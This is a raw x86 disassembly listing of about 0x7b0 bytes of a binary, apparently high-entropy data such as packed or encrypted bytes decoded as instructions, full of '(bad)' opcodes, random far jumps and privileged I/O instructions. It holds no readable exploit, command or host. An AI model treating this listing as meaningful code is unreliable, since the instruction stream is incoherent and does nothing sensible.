  41286e:	hlt    
  41286f:	push   cs
  412870:	mov    bh,0x98
  412872:	(bad)  
  412873:	mov    eax,ds:0x5062bcde
  412878:	sti    
  412879:	cdq    
  41287a:	dec    ecx
  41287b:	pminsw mm7,QWORD PTR [edi+0x77b463c2]
  412882:	xlat   BYTE PTR ds:[ebx]
  412883:	std    
  412884:	stos   BYTE PTR es:[edi],al
  412885:	sbb    ch,cl
  412887:	jno    0x41286c
  412889:	mov    ch,0x5
  41288b:	stc    
  41288c:	push   ebp
  41288d:	jmp    0x4a40:0x26fd6cc9
  412894:	push   0xffffffe0
  412896:	xchg   esp,eax
  412897:	add    al,0xe2
  412899:	or     DWORD PTR [ecx-0x7f],ebp
  41289c:	leave  
  41289d:	sub    DWORD PTR [eax+0x48],esi
  4128a0:	sbb    ebp,DWORD PTR ds:0x20998337
  4128a6:	jg     0x4128b0
  4128a8:	mov    edi,0xa9368a45
  4128ad:	icebp  
  4128ae:	pop    ecx
  4128af:	rcl    DWORD PTR [ecx-0x14],1
  4128b2:	inc    eax
  4128b3:	mov    esi,ecx
  4128b5:	subps  xmm1,xmm3
  4128b8:	sbb    al,0xdb
  4128ba:	mov    ds,eax
  4128bc:	sub    al,0x9d
  4128be:	adc    BYTE PTR [edx],dl
  4128c0:	scas   eax,DWORD PTR es:[edi]
  4128c1:	push   ebx
  4128c2:	stos   BYTE PTR es:[edi],al
  4128c3:	push   cs
  4128c4:	inc    edx
  4128c5:	int3   
  4128c6:	shl    BYTE PTR [edx-0x6a],cl
  4128c9:	adc    dh,BYTE PTR [esi]
  4128cb:	loopne 0x412944
  4128cd:	adc    eax,0x6918384c
  4128d2:	rcr    DWORD PTR [edi],0x53
  4128d5:	and    DWORD PTR [esi],edx
  4128d7:	dec    edi
  4128d8:	ds sub eax,0x87019c45
  4128de:	xor    ah,BYTE PTR [eax+0x79a96d1]
  4128e4:	cmp    al,0x6a
  4128e6:	mov    bl,0x68
  4128e8:	push   eax
  4128e9:	pop    ss
  4128ea:	dec    DWORD PTR [esp+edi*2+0x60]
  4128ee:	test   al,0xf4
  4128f0:	mov    edx,0x75930bd4
  4128f5:	sbb    al,bl
  4128f7:	cmp    BYTE PTR [edx-0x3bc8f1a9],cl
  4128fd:	xadd   dl,ch
  412900:	push   edx
  412901:	std    
  412902:	push   ss
  412903:	dec    ebp
  412904:	pop    ds
  412905:	and    ecx,DWORD PTR [ecx-0x45]
  412908:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412909:	jmp    0x9bae:0x43d99b7f
  412910:	adc    al,0x83
  412912:	inc    eax
  412913:	xor    eax,0xf9953299
  412918:	ins    DWORD PTR es:[edi],dx
  412919:	xor    esp,edi
  41291b:	jns    0x4128cb
  41291d:	daa    
  41291e:	adc    BYTE PTR [ecx],al
  412920:	cmc    
  412921:	retf   
  412922:	mov    bh,0x19
  412924:	dec    ebx
  412925:	rol    BYTE PTR [ebp-0x447e9722],1
  41292b:	dec    esp
  41292c:	ja     0x412963
  41292e:	scas   eax,DWORD PTR es:[edi]
  41292f:	mov    ebp,ebx
  412931:	rcr    DWORD PTR [edx+edi*8-0x65ed224e],0x46
  412939:	out    0x5a,eax
  41293b:	inc    ebp
  41293c:	test   DWORD PTR [ebx+0x31],ebx
  41293f:	and    BYTE PTR ds:0xda6618c5,bl
  412945:	outs   dx,DWORD PTR ds:[esi]
  412946:	icebp  
  412947:	(bad)  
  41294a:	push   es
  41294b:	call   0xdac14d68
  412950:	mov    esi,0x360b2589
  412955:	adc    DWORD PTR ds:0xe9e6e9ba,edx
  41295b:	xchg   ecx,eax
  41295c:	cld    
  41295d:	pop    eax
  41295e:	adc    edi,DWORD PTR [edi+edi*8-0x50]
  412962:	out    dx,eax
  412963:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412964:	test   al,0xf0
  412966:	fidiv  DWORD PTR [ecx-0x192c25f8]
  41296c:	fsub   st(5),st
  41296e:	cmc    
  41296f:	gs ins BYTE PTR es:[edi],dx
  412971:	mov    ds:0x72a42b4c,al
  412976:	in     eax,0xe2
  412978:	sub    ch,BYTE PTR [esi-0x2f649d6d]
  41297e:	(bad)  
  41297f:	dec    edx
  412980:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412981:	jge    0x412922
  412983:	bswap  eax
  412985:	pusha  
  412986:	jne    0x412953
  412988:	cmp    BYTE PTR [esi+0x62b9362e],bh
  41298e:	jp     0x412920
  412990:	sbb    al,0xf4
  412992:	mov    edi,0xd3293535
  412997:	mov    esp,ebx
  412999:	mov    ds:0xc2e08c22,eax
  41299e:	fstp   st(1)
  4129a0:	xchg   BYTE PTR [esi-0x58626460],bl
  4129a6:	mov    ch,0xba
  4129a8:	test   DWORD PTR [edi],0xa38c80f1
  4129ae:	pop    esp
  4129af:	jge    0x412948
  4129b1:	outs   dx,DWORD PTR ds:[esi]
  4129b2:	pop    ss
  4129b3:	adc    dh,dl
  4129b5:	mov    edx,0x9bdf8197
  4129ba:	test   DWORD PTR [ebp+0x79],ebx
  4129bd:	loopne 0x412a2a
  4129bf:	mov    esp,0x4a5e58f7
  4129c4:	sahf   
  4129c5:	out    dx,eax
  4129c6:	inc    esp
  4129c7:	pop    esi
  4129c8:	mov    cs,WORD PTR [eax+0x20]
  4129cb:	fldenv [edx]
  4129cd:	mov    ecx,0x273578ac
  4129d2:	or     al,bl
  4129d4:	jl     0x4129dd
  4129d6:	imul   esp,DWORD PTR [ecx],0x53863056
  4129dc:	pushf  
  4129dd:	mov    bh,0x71
  4129df:	mov    ebp,0x73d16d35
  4129e4:	loop   0x412a5d
  4129e6:	mov    dl,0x26
  4129e8:	jle    0x412a69
  4129ea:	jne    0x412a62
  4129ec:	int3   
  4129ed:	jmp    0x9bcd8f58
  4129f2:	cli    
  4129f3:	pusha  
  4129f4:	dec    ebp
  4129f5:	cmp    BYTE PTR [ecx+eiz*1],dh
  4129f8:	sahf   
  4129f9:	out    0xc0,eax
  4129fb:	push   ss
  4129fc:	retf   0x584
  4129ff:	test   eax,0xfbcbb0f6
  412a04:	out    dx,eax
  412a05:	push   cs
  412a06:	sbb    edi,edx
  412a08:	loop   0x412997
  412a0a:	sbb    dh,ah
  412a0c:	add    dh,BYTE PTR [ecx]
  412a0e:	mov    al,ds:0xae5af5c1
  412a13:	sub    cl,BYTE PTR [ebp+0x3fb43685]
  412a19:	call   0x470aa189
  412a1e:	mov    ss,WORD PTR [edi]
  412a20:	shr    BYTE PTR [ebp+0x20],1
  412a23:	jle    0x412a99
  412a25:	int    0x4
  412a27:	js     0x412a58
  412a29:	popf   
  412a2a:	pop    edi
  412a2b:	or     eax,0xd9d4338c
  412a30:	pop    ecx
  412a31:	adc    al,0x21
  412a33:	mov    cs,WORD PTR [edi-0x57]
  412a36:	pop    edx
  412a37:	lods   al,BYTE PTR ds:[esi]
  412a38:	fild   QWORD PTR [edx+0x38]
  412a3b:	pop    edx
  412a3c:	push   esp
  412a3d:	imul   eax,DWORD PTR [edi-0x49],0xa39f28d
  412a44:	or     al,0xfa
  412a46:	sbb    al,0x3b
  412a48:	dec    esi
  412a49:	fwait
  412a4a:	fwait
  412a4b:	mov    DWORD PTR [esi-0x21abb425],0x66e56b71
  412a55:	inc    ecx
  412a56:	fcmovnbe st,st(2)
  412a58:	ffree  st(6)
  412a5a:	ret    
  412a5b:	test   DWORD PTR [ebp+edx*2-0xa4d1053],esp
  412a62:	mov    esi,0x8c765524
  412a67:	not    DWORD PTR [ebx+0xfafa3b5]
  412a6d:	cmp    edx,edi
  412a6f:	sbb    DWORD PTR [ebp+eiz*8-0x75],0x73a093fc
  412a77:	jo     0x412af3
  412a79:	scas   eax,DWORD PTR es:[edi]
  412a7a:	inc    edx
  412a7b:	add    BYTE PTR [eax+0x5d8adf30],ch
  412a81:	cmp    dl,BYTE PTR [eax]
  412a83:	add    BYTE PTR [edx+0x3e1489bb],ch
  412a89:	fs loop 0x412af9
  412a8c:	pop    esp
  412a8d:	inc    esi
  412a8e:	leave  
  412a8f:	add    DWORD PTR gs:[ecx],ebp
  412a92:	add    ch,BYTE PTR [edx+edi*4+0x1e]
  412a96:	sbb    eax,0x7b9ba40
  412a9b:	fistp  DWORD PTR [ebp-0x6d628d65]
  412aa1:	push   es
  412aa2:	iret   
  412aa3:	addr16 mov ebp,0x8110e22d
  412aa9:	or     ebp,DWORD PTR [eax-0x5e]
  412aac:	fst    QWORD PTR [edi]
  412aae:	and    BYTE PTR [edx],dl
  412ab0:	xor    BYTE PTR [edi],ch
  412ab2:	xchg   ebp,eax
  412ab3:	xlat   BYTE PTR ds:[ebx]
  412ab4:	push   ebx
  412ab5:	in     eax,dx
  412ab6:	push   eax
  412ab7:	(bad)  
  412ab9:	or     ebx,edx
  412abb:	add    al,0x9e
  412abd:	dec    ecx
  412abe:	leave  
  412abf:	popa   
  412ac0:	mov    dh,0x6
  412ac2:	popf   
  412ac3:	or     DWORD PTR [edx+0xba2a53b],0xffffffdc
  412aca:	dec    esi
  412acb:	shl    al,1
  412acd:	push   esi
  412ace:	fld    TBYTE PTR [ecx+0x8]
  412ad1:	xchg   BYTE PTR [esp+eax*1-0x68],ah
  412ad5:	xchg   ebx,eax
  412ad6:	mov    bh,0xe7
  412ad8:	out    dx,eax
  412ad9:	push   0xceef9ce
  412ade:	mov    ds:0xb9c55e58,al
  412ae3:	jo     0x412aba
  412ae5:	and    al,0xd2
  412ae7:	sbb    esi,DWORD PTR [eax]
  412ae9:	mov    bl,0xf9
  412aeb:	inc    ebx
  412aec:	out    dx,al
  412aed:	mov    al,0xdf
  412aef:	arpl   ax,cx
  412af1:	xchg   ebx,eax
  412af2:	dec    ecx
  412af3:	test   DWORD PTR [esi+0x467c4b4e],ebx
  412af9:	ins    BYTE PTR es:[edi],dx
  412afa:	adc    al,0x62
  412afc:	repz add BYTE PTR [ebp-0xc],ch
  412b00:	push   0xe43b94ec
  412b05:	xor    dh,dh
  412b07:	mov    ebp,0x6ae4ab7b
  412b0c:	xlat   BYTE PTR ds:[ebx]
  412b0d:	jge    0x412b51
  412b0f:	mov    eax,0xed3f68d8
  412b14:	sub    eax,0xc061f9df
  412b19:	cli    
  412b1a:	pop    esp
  412b1b:	shr    edi,1
  412b1d:	pop    ss
  412b1e:	mov    dh,0x71
  412b20:	sub    edx,DWORD PTR [ecx]
  412b22:	stc    
  412b23:	(bad)  
  412b24:	mov    al,0x32
  412b26:	ins    DWORD PTR es:[edi],dx
  412b27:	aad    0x67
  412b29:	or     ah,BYTE PTR [eax-0x48]
  412b2c:	mov    edi,0x9adf4891
  412b31:	push   0x1b405baa
  412b36:	jno    0x412bb7
  412b38:	popf   
  412b39:	mov    edi,0xde79f120
  412b3e:	in     al,dx
  412b3f:	cdq    
  412b40:	dec    edx
  412b41:	xor    al,0x44
  412b43:	xchg   edi,eax
  412b44:	jne    0x412b49
  412b46:	adc    ecx,DWORD PTR [esi+ebp*8+0x607e62c3]
  412b4d:	call   0x22bb21c4
  412b52:	adc    al,0xb
  412b54:	gs xor eax,0x8ecd9872
  412b5a:	test   eax,0xc646108e
  412b5f:	mov    ch,0x41
  412b61:	mov    bl,0x32
  412b63:	int3   
  412b64:	cld    
  412b65:	mov    eax,ds:0xafded98d
  412b6a:	sub    ebx,esi
  412b6c:	push   esi
  412b6d:	inc    ebx
  412b6e:	pop    ebx
  412b6f:	ss push 0x743bb4f0
  412b75:	cmp    esi,eax
  412b77:	mov    eax,0xea73d8c8
  412b7c:	sbb    al,0xfd
  412b7e:	cmp    DWORD PTR [edx],ecx
  412b80:	dec    ebx
  412b81:	(bad)  
  412b82:	(bad)  
  412b83:	in     eax,dx
  412b84:	rcr    BYTE PTR [esi+0x3b0a97c4],1
  412b8a:	lahf   
  412b8b:	mov    ds:0xda7ad83,al
  412b90:	lods   al,BYTE PTR ds:[esi]
  412b91:	push   cs
  412b92:	cdq    
  412b93:	xchg   ebp,eax
  412b94:	fiadd  DWORD PTR [edx-0x664f4975]
  412b9a:	sub    ah,BYTE PTR [esi]
  412b9c:	int3   
  412b9d:	mov    bh,0x8d
  412b9f:	fld    TBYTE PTR [eax]
  412ba1:	dec    ebp
  412ba2:	inc    ebx
  412ba3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ba4:	xchg   BYTE PTR [ebx-0x7c7396b3],ah
  412baa:	pop    ebp
  412bab:	mov    dl,0x87
  412bad:	ror    al,cl
  412baf:	mov    ds:0xe3c6a723,eax
  412bb5:	je     0x412c26
  412bb7:	push   esi
  412bb8:	jne    0x412b90
  412bba:	xchg   esi,eax
  412bbb:	(bad)  
  412bbc:	sahf   
  412bbd:	xchg   BYTE PTR [esi+0x7cd8994c],ah
  412bc3:	lods   eax,DWORD PTR ds:[esi]
  412bc4:	xor    DWORD PTR [edi],ebx
  412bc6:	sbb    BYTE PTR [ebx+0x4c],al
  412bc9:	push   ecx
  412bca:	retf   0xbe47
  412bcd:	dec    edi
  412bce:	das    
  412bcf:	das    
  412bd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412bd1:	push   ebp
  412bd2:	xchg   edi,eax
  412bd3:	fisub  WORD PTR [esi+0x5f]
  412bd6:	imul   esp,DWORD PTR [ebp-0x14945d6a],0x7c961be2
  412be0:	dec    esp
  412be1:	hlt    
  412be2:	cmp    al,0x28
  412be4:	xor    bl,BYTE PTR [ecx+eiz*4+0x75]
  412be8:	xlat   BYTE PTR ds:[ebx]
  412be9:	addr16 cmp eax,0xffffffb3
  412bed:	dec    esi
  412bee:	cmc    
  412bef:	data16 xor BYTE PTR [eax+0x44],dl
  412bf3:	gs adc al,0xaf
  412bf6:	ror    DWORD PTR [ebx-0x337d46ab],cl
  412bfc:	cmp    BYTE PTR [esi+0x24],bl
  412bff:	stos   BYTE PTR es:[edi],al
  412c00:	or     eax,0x62a961a9
  412c05:	ret    0xcdcd
  412c08:	inc    edx
  412c09:	fnstenv [edi-0x12e956fd]
  412c0f:	iret   
  412c10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c11:	mov    esp,0xd7a4d5d4
  412c16:	inc    ebp
  412c17:	int3   
  412c18:	out    dx,al
  412c19:	push   0x4e
  412c1b:	sbb    ax,0x72a8
  412c1f:	cmp    BYTE PTR [ecx+0x28cd608f],bh
  412c25:	in     eax,0x9b
  412c27:	nop
  412c28:	fwait
  412c29:	mov    dl,0x70
  412c2b:	cwde   
  412c2c:	out    0x97,al
  412c2e:	bound  esi,QWORD PTR [ebx+edi*1+0x73b3c67b]
  412c35:	or     esp,DWORD PTR [edi-0x6b]
  412c38:	xlat   BYTE PTR ds:[ebx]
  412c39:	push   ss
  412c3a:	inc    edx
  412c3b:	adc    edx,edx
  412c3d:	scas   eax,DWORD PTR es:[edi]
  412c3e:	mov    dh,0xaf
  412c40:	and    al,0xc2
  412c42:	mov    edi,0xc9fd2b7b
  412c47:	fist   DWORD PTR [esi]
  412c49:	aaa    
  412c4a:	jnp    0x412bd9
  412c4c:	mov    DWORD PTR [ecx],edi
  412c4e:	stc    
  412c4f:	test   al,0x4f
  412c51:	mov    ecx,0x3331aac1
  412c56:	cs ins DWORD PTR es:[edi],dx
  412c58:	push   ss
  412c59:	cs pop ds
  412c5b:	(bad)  
  412c5c:	jmp    0x7da5:0xa412a727
  412c63:	out    0xb,eax
  412c65:	ret    
  412c66:	lods   al,BYTE PTR ds:[esi]
  412c67:	pop    ecx
  412c68:	pushf  
  412c69:	test   eax,0x6ccd95b2
  412c6e:	ds dec edx
  412c70:	(bad)  
  412c71:	popf   
  412c72:	fstp   TBYTE PTR [esi]
  412c74:	enter  0x7f23,0xff
  412c78:	mov    ds:0x6d0a4136,eax
  412c7d:	xchg   bl,ah
  412c7f:	push   ds
  412c80:	ror    BYTE PTR [eax-0x3ac7d3a8],cl
  412c86:	adc    BYTE PTR ds:0x839ddea9,bl
  412c8c:	dec    edx
  412c8d:	xor    eax,0x1d8704cf
  412c92:	pop    edx
  412c93:	cmp    eax,0x351bb3e2
  412c98:	adc    BYTE PTR [eax-0x7aaee79e],ch
  412c9e:	sahf   
  412c9f:	jns    0x412d08
  412ca1:	fs fnstsw ax
  412ca4:	jge    0x412c37
  412ca6:	xchg   BYTE PTR [edx+ebx*8-0x1ff1cdba],ch
  412cad:	push   ebx
  412cae:	mov    ch,0x82
  412cb0:	sbb    cl,0xf
  412cb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412cb4:	push   ebp
  412cb5:	into   
  412cb6:	push   esi
  412cb7:	add    ecx,DWORD PTR [eax+0x59]
  412cba:	cdq    
  412cbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412cbc:	xor    dh,bl
  412cbe:	(bad)
  412cc3:	cmc    
  412cc4:	out    dx,eax
  412cc5:	mov    ebx,0x8b40301c
  412cca:	fsub   DWORD PTR [ebx]
  412ccc:	in     eax,0xf1
  412cce:	popa   
  412ccf:	(bad)  
  412cd0:	ins    DWORD PTR es:[edi],dx
  412cd1:	mov    ss,ecx
  412cd3:	xor    eax,0xec1a41ed
  412cd8:	and    al,0x1d
  412cda:	stc    
  412cdb:	scas   eax,DWORD PTR es:[edi]
  412cdc:	outs   dx,BYTE PTR ds:[esi]
  412cdd:	leave  
  412cde:	xor    BYTE PTR [edi-0x40],dl
  412ce1:	mov    eax,ds:0x5de018e8
  412ce6:	rcl    DWORD PTR [edx+esi*2+0x4ca829ad],0xa0
  412cee:	sub    DWORD PTR [edx-0x6bc6006b],0xb82a2aef
  412cf8:	xchg   edx,eax
  412cf9:	sub    esi,ecx
  412cfb:	pop    eax
  412cfc:	sub    ecx,ebx
  412cfe:	cli    
  412cff:	jmp    0x412cd8
  412d01:	pop    ecx
  412d02:	or     DWORD PTR [edi+0x12ed6bf8],ebp
  412d08:	int3   
  412d09:	ret    0xef39
  412d0c:	repnz dec ebx
  412d0e:	xor    al,0xff
  412d10:	mov    bh,0x82
  412d12:	mov    eax,ss
  412d14:	adc    al,0x2f
  412d16:	clts   
  412d18:	add    ebp,DWORD PTR [ebp-0x5b0f851c]
  412d1e:	xlat   BYTE PTR ds:[ebx]
  412d1f:	jg     0x412cf6
  412d21:	ins    BYTE PTR es:[edi],dx
  412d22:	jnp    0x412d19
  412d24:	pop    ds
  412d25:	jle    0x412d07
  412d27:	mov    esi,0x3d16385f
  412d2c:	loopne 0x412d1d
  412d2e:	mov    edx,0x11e381d1
  412d33:	inc    edi
  412d34:	je     0x412d1c
  412d36:	mov    ?,esp
  412d38:	inc    ch
  412d3a:	jecxz  0x412d3e
  412d3c:	shl    ch,0x2d
  412d3f:	loop   0x412d61
  412d41:	fsubr  st(7),st
  412d43:	sub    al,0x7a
  412d45:	aad    0xed
  412d47:	sub    ch,BYTE PTR [ebp+esi*1+0xa2b1239]
  412d4e:	jg     0x412cf3
  412d50:	cmp    ah,bh
  412d52:	(bad)  
  412d53:	out    dx,al
  412d54:	add    eax,0xe24c8abc
  412d59:	popf   
  412d5a:	outs   dx,BYTE PTR ds:[esi]
  412d5b:	mov    edi,0x30eaef14
  412d60:	cmc    
  412d61:	pop    ds
  412d62:	adc    bl,ah
  412d64:	outs   dx,DWORD PTR ds:[esi]
  412d65:	adc    BYTE PTR [esi+ecx*4+0x700a069b],ah
  412d6c:	and    al,0x87
  412d6e:	jge    0x412d4c
  412d70:	in     eax,0xc
  412d72:	mov    eax,ds:0xb03e24ba
  412d77:	xchg   DWORD PTR [eax],edi
  412d79:	push   esi
  412d7a:	nop
  412d7b:	mov    ah,0x2f
  412d7d:	mov    ebx,0xf7fdc92d
  412d82:	mov    cl,0x50
  412d84:	xlat   BYTE PTR ds:[ebx]
  412d85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d86:	in     eax,0x94
  412d88:	mov    DWORD PTR [ebx],esp
  412d8a:	dec    edx
  412d8b:	pop    ds
  412d8c:	cmc    
  412d8d:	mov    esp,0x91d7b99f
  412d92:	fwait
  412d93:	cmp    cl,BYTE PTR [edi+0x65218073]
  412d99:	inc    ebp
  412d9a:	or     BYTE PTR [eax],ch
  412d9c:	pop    ecx
  412d9d:	mov    dh,0xa4
  412d9f:	test   BYTE PTR [edx-0xc406b82],dl
  412da5:	mov    edi,DWORD PTR [ebx]
  412da7:	add    edx,esi
  412da9:	inc    edi
  412daa:	mov    al,0x65
  412dac:	adc    DWORD PTR [edi],eax
  412dae:	jge    0x412e12
  412db0:	rol    BYTE PTR [ebx-0x15],1
  412db3:	cli    
  412db4:	sub    esi,DWORD PTR [eax-0x66]
  412db7:	push   ds
  412db8:	pop    esp
  412db9:	mov    ebp,0x357af5db
  412dbe:	sbb    eax,0x2cd74c4d
  412dc3:	(bad)  
  412dc4:	inc    ah
  412dc6:	xor    BYTE PTR [edi],dh
  412dc8:	imul   ecx,DWORD PTR [eax-0x6242eded],0xc0b6b8aa
  412dd2:	inc    ecx
  412dd3:	and    eax,0x277c1adc
  412dd8:	es mov ah,0xee
  412ddb:	enter  0x40a7,0x47
  412ddf:	dec    edi
  412de0:	dec    ebx
  412de1:	xlat   BYTE PTR ds:[ebx]
  412de2:	sar    DWORD PTR [edi-0x1a3342c2],cl
  412de8:	lahf   
  412de9:	cmp    DWORD PTR ds:0xcf4b9c54,0xd38fe5f7
  412df3:	cmc    
  412df4:	loop   0x412e45
  412df6:	sub    eax,0x967c3406
  412dfb:	fisttp WORD PTR [edi+0x40]
  412dfe:	arpl   WORD PTR [esi],dx
  412e00:	xor    eax,0xc7f1c674
  412e05:	fadd   DWORD PTR [ecx+0x41]
  412e08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e09:	call   0xee48f202
  412e0e:	leave  
  412e0f:	xor    BYTE PTR [esi+0x75],dh
  412e12:	adc    ecx,esp
  412e14:	outs   dx,BYTE PTR ds:[esi]
  412e15:	mov    dh,0xf6
  412e17:	fs ret 0x86b0
  412e1b:	adc    al,0x2a
  412e1d:	xor    eax,0x382cc0a4
  412e22:	mov    ds:0x4568fe3f,al
  412e27:	sbb    esp,esi
  412e29:	mov    ds:0xc9af4a38,al
  412e2e:	sti    
  412e2f:	sub    ebx,ecx
  412e31:	dec    eax
  412e32:	cmp    ebx,ecx
  412e34:	fcomp  QWORD PTR [esi]
  412e36:	ins    DWORD PTR es:[edi],dx
  412e37:	test   al,0x17
  412e39:	xchg   ebp,eax
  412e3a:	fdiv   DWORD PTR [ebp-0xe]
  412e3d:	inc    edi
  412e3e:	cmc    
  412e3f:	ds pop ebx
  412e41:	jge    0x412de4
  412e43:	adc    dh,cl
  412e45:	jl     0x412e8b
  412e47:	mov    esp,0x9bc012dc
  412e4c:	mov    ecx,0xbce65e77
  412e51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e53:	ret    0xbc75
  412e56:	sbb    BYTE PTR [ecx+ecx*4],0xff
  412e5a:	jmp    0x984a:0x2169ad7b
  412e61:	or     eax,0x59c59113
  412e66:	push   es
  412e67:	add    bl,dh
  412e69:	cmp    al,0xde
  412e6b:	in     eax,dx
  412e6c:	or     eax,0x63618b74
  412e71:	shl    BYTE PTR [edx+0x64],0xa4
  412e75:	arpl   WORD PTR [edi+0x69ec5fd4],bx
  412e7b:	test   eax,0x3f46f930
  412e80:	sti    
  412e81:	push   eax
  412e82:	sub    dh,BYTE PTR [edx-0x1b88d29e]
  412e88:	and    ch,BYTE PTR [edi-0x51]
  412e8b:	cmp    eax,0x1455f4f1
  412e90:	sbb    cl,0xbc
  412e93:	xchg   edi,eax
  412e94:	jp     0x412e83
  412e96:	daa    
  412e97:	ja     0x412ee8
  412e99:	mov    eax,0xb97f1a2f
  412e9e:	or     esi,DWORD PTR [edi+0x19a7c60d]
  412ea4:	jmp    0x412ed7
  412ea6:	xor    BYTE PTR [eax+0x2d],0x2
  412eaa:	pushf  
  412eab:	inc    esp
  412eac:	out    0x9c,al
  412eae:	out    dx,eax
  412eaf:	and    BYTE PTR [eax-0x3b],al
  412eb2:	fisubr DWORD PTR [ecx+0x58ecd5a4]
  412eb8:	add    eax,DWORD PTR [ecx]
  412eba:	clc    
  412ebb:	add    BYTE PTR [ebp+0x50b1fdae],bl
  412ec1:	sub    al,0xf7
  412ec3:	xchg   edi,eax
  412ec4:	adc    esp,DWORD PTR [edi+ebx*8+0x3cd626bb]
  412ecb:	pop    edx
  412ecc:	bound  ebp,QWORD PTR [ecx-0x66]
  412ecf:	mov    BYTE PTR [ecx],al
  412ed1:	and    BYTE PTR [edi-0x4e25b577],dh
  412ed7:	sub    ecx,esi
  412ed9:	sbb    BYTE PTR [esi+0x3ac3476d],bl
  412edf:	hlt    
  412ee0:	inc    esp
  412ee1:	xor    al,0xc0
  412ee3:	mov    edx,0x5ddd9984
  412ee8:	or     BYTE PTR [eax+0x5d],0xdb
  412eec:	outs   dx,DWORD PTR ds:[esi]
  412eed:	adc    dh,BYTE PTR [esi-0x75ad5e9f]
  412ef3:	or     bh,BYTE PTR [eax-0x1b]
  412ef6:	jns    0x412f4e
  412ef8:	adc    bl,BYTE PTR [eax-0x74fc1c10]
  412efe:	fidivr DWORD PTR [esi+ebp*4+0x50]
  412f02:	inc    ebp
  412f03:	es nop
  412f05:	mov    eax,0x79f7c341
  412f0a:	lods   eax,DWORD PTR ds:[esi]
  412f0b:	push   ebp
  412f0c:	ret    
  412f0d:	add    DWORD PTR [edi],0x8
  412f10:	cmp    DWORD PTR [esp+edx*8+0x7e],edi
  412f14:	dec    DWORD PTR [eax]
  412f16:	adc    ecx,edi
  412f18:	jne    0x412eec
  412f1a:	xchg   edx,eax
  412f1b:	(bad)  [ecx*8-0x6eb91480]
  412f22:	jg     0x412f38
  412f24:	nop
  412f25:	mov    WORD PTR [edi+0x33b5ef25],ds
  412f2b:	outs   dx,DWORD PTR ds:[esi]
  412f2c:	push   0xffffffb5
  412f2e:	imul   BYTE PTR [ecx+0x1173c63f]
  412f34:	jbe    0x412ec2
  412f36:	xchg   ebx,eax
  412f37:	inc    ecx
  412f38:	inc    ecx
  412f39:	pop    esi
  412f3a:	dec    esi
  412f3b:	push   es
  412f3c:	pop    es
  412f3d:	add    al,0xc0
  412f3f:	mov    ah,0xac
  412f41:	pop    ecx
  412f42:	data16 jle 0x412f9a
  412f45:	cmp    BYTE PTR [ecx+0x1e],dl
  412f48:	or     al,0x8a
  412f4a:	jnp    0x412ef0
  412f4c:	int3   
  412f4d:	push   0x5b67148b
  412f52:	sahf   
  412f53:	enter  0xaa58,0xb9
  412f57:	dec    esi
  412f58:	push   esi
  412f59:	mov    esi,0x553ba183
  412f5e:	retf   
  412f5f:	push   es
  412f60:	test   al,0xa8
  412f62:	add    DWORD PTR [edi],0xa749ab6f
  412f68:	aas    
  412f69:	dec    esp
  412f6a:	test   ecx,0xb324f3ec
  412f70:	(bad)  
  412f71:	mov    esp,0x591e7a64
  412f76:	pop    ebp
  412f77:	ins    DWORD PTR es:[edi],dx
  412f78:	dec    esp
  412f79:	ss mov dh,0xcb
  412f7c:	or     edx,DWORD PTR [ebx+ecx*2]
  412f7f:	pop    ebx
  412f80:	addr16 daa 
  412f82:	ret    
  412f83:	ret    
  412f84:	popf   
  412f85:	mov    DWORD PTR [ebx],eax
  412f87:	sahf   
  412f88:	test   BYTE PTR [ebp-0x49],cl
  412f8b:	sbb    BYTE PTR ds:0xd31704e8,dh
  412f91:	scas   al,BYTE PTR es:[edi]
  412f92:	nop
  412f93:	mov    al,0xcb
  412f95:	div    DWORD PTR [eax]
  412f97:	xchg   bh,dh
  412f99:	das    
  412f9a:	add    DWORD PTR [ecx+0x54],esp
  412f9d:	xor    DWORD PTR [edx+0x3b],edi
  412fa0:	adc    bl,0xb
  412fa3:	mov    al,0xa8
  412fa5:	enter  0x8a65,0x53
  412fa9:	sub    DWORD PTR [esi],0x23
  412fac:	or     eax,0xe789d8c3
  412fb1:	xchg   esi,eax
  412fb2:	mov    DWORD PTR [esi],edx
  412fb4:	out    dx,eax
  412fb5:	sbb    ebx,esi
  412fb7:	ret    
  412fb8:	jb     0x412fa3
  412fba:	sahf   
  412fbb:	cli    
  412fbc:	ss xor al,0xe
  412fbf:	sti    
  412fc0:	mov    gs,esi
  412fc2:	mov    ecx,DWORD PTR [edi-0x3]
  412fc5:	mov    al,ds:0x357768e2
  412fca:	scas   eax,DWORD PTR es:[edi]
  412fcb:	daa    
  412fcc:	mov    ds,WORD PTR [ecx]
  412fce:	xchg   edx,eax
  412fcf:	cmp    DWORD PTR [edi-0x5ce9a856],ebx
  412fd5:	cmp    DWORD PTR [ebp-0x18705365],0xf
  412fdc:	movd   eax,mm2
  412fdf:	loope  0x412fa0
  412fe1:	jo     0x412ffb
  412fe3:	(bad)  
  412fe4:	fst    DWORD PTR [ecx+edi*8-0xe]
  412fe8:	lods   eax,DWORD PTR ds:[esi]
  412fe9:	dec    esi
  412fea:	or     eax,0x2ad8f348
  412fef:	pop    ecx
  412ff0:	ins    BYTE PTR es:[edi],dx
  412ff1:	ret    0xa3f2
  412ff4:	or     al,BYTE PTR [esi]
  412ff6:	test   dl,0xcb
  412ff9:	push   cs
  412ffa:	(bad)  
  412ffc:	pop    eax
  412ffd:	mov    esi,0x51233f42
  413002:	fsub   st(7),st
  413004:	outs   dx,DWORD PTR ds:[esi]
  413005:	js     0x412fc3
  413007:	pop    ebx
  413008:	and    DWORD PTR [ecx],ebx
  41300a:	mov    al,ds:0xeee6fb1b
  41300f:	or     esi,esp
  413011:	pop    eax
  413012:	(bad)  
  413013:	aad    0xc
  413015:	sbb    BYTE PTR [esi+ebx*4+0x5dcb0a46],dh
  41301c:	jg     0x413003
  41301e:	xchg   esp,eax
